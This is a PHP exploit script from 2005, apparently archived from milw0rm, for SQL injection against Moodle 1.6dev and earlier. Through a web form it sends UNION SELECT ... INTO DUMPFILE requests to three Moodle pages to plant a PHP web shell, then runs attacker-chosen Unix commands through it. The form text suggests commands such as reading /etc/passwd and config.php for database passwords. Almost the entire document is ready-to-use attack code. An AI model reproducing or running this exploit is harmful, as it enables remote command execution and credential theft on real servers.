<?php
#   moodle16dev_xpl.php                                 4.19 10/11/2005        #
#                                                                              #
#           Moodle <= 1.6dev get record()  SQL injection /                     #
#                   / remote commands execution                                #
#                              by rgod                                         #
#                  site: http://rgod.altervista.org                            #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  make these changes in php.ini if you have troubles                          #
#  with this script:                                                           #
#  allow_call_time_pass_reference = on                                         #
#  register_globals = on                                                       #
#                                                                              #
#  Sun-Tzu:"If your opponent is of choleric temper, seek to irritate him.      #
#  Pretend to be weak, that he may grow arrogant."                             #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<html><head><title>Moodle 1.6dev  SQL Injection /remote cmmnds xctn</title>
<meta http-equiv="Content-Type"  content="text/html; charset=iso-8859-1"> <style
type="text/css"> body {	background-color:#111111; SCROLLBAR-ARROW-COLOR:#ffffff;
SCROLLBAR-BASE-COLOR: black;    CURSOR: crosshair;    color:   #1CB081; }    img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head> <body> <p class="Stile6">
Moodle <= 1.6dev    remote      commands        xcution           </p><p class="
Stile6">a script by rgod at <a href="http://rgod.altervista.org"target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%"> <form
name="form1"      method="post"   action="'.$SERVER[PHP_SELF].'?path=value&host=
value&port=value&command=value&proxy=value"><p><input type="text"   name="host">
<span class="Stile5">hostname (ex: www.sitename.com)  </span>   </p> <p>  <input
type="text" name="path"><span class="Stile5">  path ( ex:  /moodle/  or just /)
</span></p><p> <input type="text" name="pathtoWWW"><span class="Stile5">    path
to WWW ftom Mysql directory, need this for "...INTO OUTFILE ..." statement
(default: ../../www) </span></p><p><input type="text" name="port" >        <span
class="Stile5"> specify a port other than 80 (default value)</span>      </p><p>
<input type="text" name="command"> <span  class="Stile5">a Unix command ,
example: ls -la  to list directories, cat /etc/passwd to show passwd file,   cat
config.php to see database username and password</span>
</p><p><input type="text" name="proxy"><span class="Stile5">send exploit through
an HTTP proxy (ip:port)</span></p><p><input type="submit"name="Submit"
value="go!"></p></form></td></tr></table></body></html>';


function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
                   echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
                   }
	      else //fixed some errors in this function
 		  { if ($proxy=='')
		   {
             echo "Attempting to connect to ".$host." on port ".$port."...<br>";
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {
             $c = preg_match($proxy_regex,$proxy);
             if (!$c) {echo 'Not a valid proxy...';die;}
             $parts =explode(':',$proxy);
             echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
		     $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result < 0) {
           echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
                            }
	                       else
		                    {
                        echo "OK.<br><br>";
                        $html= '';
                        socket_write($socket, $packet, strlen($packet));
                        echo "Reading response:<br>";
                        while ($out= socket_read($socket, 2048)) {$html.=$out;}
                        echo nl2br(htmlentities($html));
                        echo "Closing socket...";
                        socket_close($socket);
                            }
          }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
           {$ock=fsockopen($host,$port);
            if (!$ock) { echo 'No response from '.htmlentities($host).' ...'; die;}
           }
             else
           {
	          $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid proxy...';
                        die;
                       }
	          $parts=explode(':',$proxy);
	          echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	          $ock=fsockopen($parts[0],$parts[1]);
	          if (!$ock) { echo 'No response from proxy...'; die;}
	       }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}

function execute_commands()
{
global $p, $host, $port, $packet, $command, $html;
$packet="GET ".$p."shell.php?cmd=".urlencode($command)." HTTP/1.1\r\n";
$packet.="Host: ".$host.":".$port."\r\n";
$packet.="Connection: CLose\r\n\r\n";
show($packet);
sendpacketii($packet);
if (eregi("Hi Master", $html)) {echo "Exploit succeeded..."; die; }
                          else {echo "Exploit failed...";}
}


if (($host<>'') and ($path<>'') and ($command<>''))
{
  $port=intval(trim($port));
  if ($port=='') {$port=80;}
  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
  if ($pathtoWWW=='') {$pathtoWWW="../../www";}
  #default, path for "INTO OUTFILE '[path][file]', two dirs up from mysql data directory, change it for
  #different installations
  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$SHELL="<?php error_reporting(0);ini_set(\"max_execution_time\",0);echo \"Hi Master \";system(\$_GET[cmd]);?>";

$SQL="'UNION SELECT 0,'".$SHELL."',0,0,0,0,0,0 INTO DUMPFILE '".$pathtoWWW.$path."shell.php' FROM mdl_course_categories/*";
$SQL=urlencode($SQL);
$packet="GET ".$p."course/category.php?id=".$SQL." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
sendpacketii($packet);
execute_commands();

$SQL="'UNION SELECT 0,0,0,0,'".$SHELL."',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 INTO DUMPFILE '".$pathtoWWW.$path."shell.php' FROM mdl_course/*";
$SQL=urlencode($SQL);
$packet="GET ".$p."course/info.php?id=".$SQL." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
sendpacketii($packet);
execute_commands();

$SQL="'UNION SELECT 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,'".$SHELL."',0,0,0,0,0,0,0,0 INTO DUMPFILE '".$pathtoWWW.$path."shell.php' FROM mdl_user/*";
$SQL=urlencode($SQL);
$packet="GET ".$p."iplookup/ipatlas/plot.php?address=127.0.0.1&user=".$SQL." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
sendpacketii($packet);
execute_commands();

}
else
{echo 'Fill in requested fields, optionally specify a proxy';}
?>

# milw0rm.com [2005-11-10]